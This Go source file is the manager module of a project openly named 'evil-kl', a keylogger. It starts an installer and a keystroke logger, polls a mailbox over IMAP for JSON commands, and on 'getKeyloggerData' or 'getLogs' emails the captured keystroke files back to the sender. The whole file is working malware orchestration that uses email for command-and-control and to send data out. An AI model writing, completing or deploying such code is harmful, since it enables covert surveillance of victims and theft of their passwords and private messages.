package manager

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"

	logger "github.com/dm1trypon/easy-logger"
	"github.com/dm1trypon/evil-kl/internal/app/api"
	"github.com/dm1trypon/evil-kl/internal/app/config"
	"github.com/dm1trypon/evil-kl/internal/app/installer"
	"github.com/dm1trypon/evil-kl/internal/app/keylogger"
	"github.com/dm1trypon/evil-kl/internal/app/mail"
	"github.com/dm1trypon/evil-kl/internal/app/manager/schemas"
	"github.com/qri-io/jsonschema"
)

/*
Create <Manager> - init Manager structure
	Returns <*Manager>:
		1. Structure pointer
	Args:
		1. cfg <config.Cfg> - service's config
*/
func (m *Manager) Create(cfg config.Cfg) *Manager {
	m = &Manager{
		lc:            "MANAGER",
		klInst:        new(keylogger.Keylogger).Create(),
		mailInst:      new(mail.Mail).Create(),
		apiInst:       new(api.Api).Create(cfg),
		installerInst: new(installer.Installer).Create(cfg),
		cfg:           cfg,
		chCritError:   make(chan bool, 1),
	}

	return m
}

// Run <Manager> - starting the main module of the service
func (m *Manager) Run() {
	logger.InfoJ(m.lc, "Starting Manager module")

	go m.errorHandler()

	m.installerInst.Run()

	m.klInst.SetLogsPath(m.cfg.Keylogger.Path)
	m.klInst.SetLogsFileName(m.cfg.Keylogger.Name)
	m.klInst.Run()

	go m.mailHandler()

	m.mailInst.SetIMAPSetting(m.cfg.Mail.IMAP)
	m.mailInst.SetSMTPSetting(m.cfg.Mail.SMTP)
	m.mailInst.SetServiceMask(m.cfg.Service.Name)
	m.mailInst.SetServiceID(m.cfg.Service.ID)
	m.mailInst.Run()
}

// errorHandler <Manager> - checking for critical service errors
func (m *Manager) errorHandler() {
	select {
	case <-m.installerInst.GetChCritError():
		m.chCritError <- true
		return
	case <-m.mailInst.GetChCritError():
		m.chCritError <- true
		return
	case <-m.klInst.GetChCritError():
		m.chCritError <- true
		return
	}
}

/*
GetChCritError <Manager> - getting the channel of the critical error Manager
	Returns <<-chan bool>:
		1. error's channel
*/
func (m *Manager) GetChCritError() <-chan bool {
	return m.chCritError
}

// mailHandler - checking new data from incoming messages
func (m *Manager) mailHandler() {
	chInlineData := m.mailInst.GetChInlineData()

	for {
		msgData := <-chInlineData

		for from, body := range msgData {
			m.task(body, from)
		}
	}
}

/*
task <Manager> - API task allocator
	Args:
		1. body <[]byte> - message's body
		2. from <string> - sender's address
*/
func (m *Manager) task(body []byte, from string) {
	ctx := context.Background()

	rs := &jsonschema.Schema{}

	for method, scBody := range schemas.SchemasMap {
		if err := json.Unmarshal([]byte(scBody), rs); err != nil {
			logger.ErrorJ(m.lc, fmt.Sprint("Wrong JSON schema: ", err.Error()))
			continue
		}

		errs, err := rs.ValidateBytes(ctx, body)
		if err != nil {
			continue
		}

		if len(errs) > 0 {
			continue
		}

		if method == "getKeyloggerData" {
			msg, path := m.apiInst.GetKeyloggerData(method)
			m.mailInst.Send(from, "Subject", msg, path)
		} else if method == "getLogs" {
			msg, path := m.apiInst.GetLogs(method)
			m.mailInst.Send(from, "Subject", msg, path)
		} else {
			err := errors.New(fmt.Sprint("Unknown method: ", method))

			logger.ErrorJ(m.lc, err.Error())

			m.mailInst.Send(from, "Subject", err.Error(), "")
		}

		break
	}
}
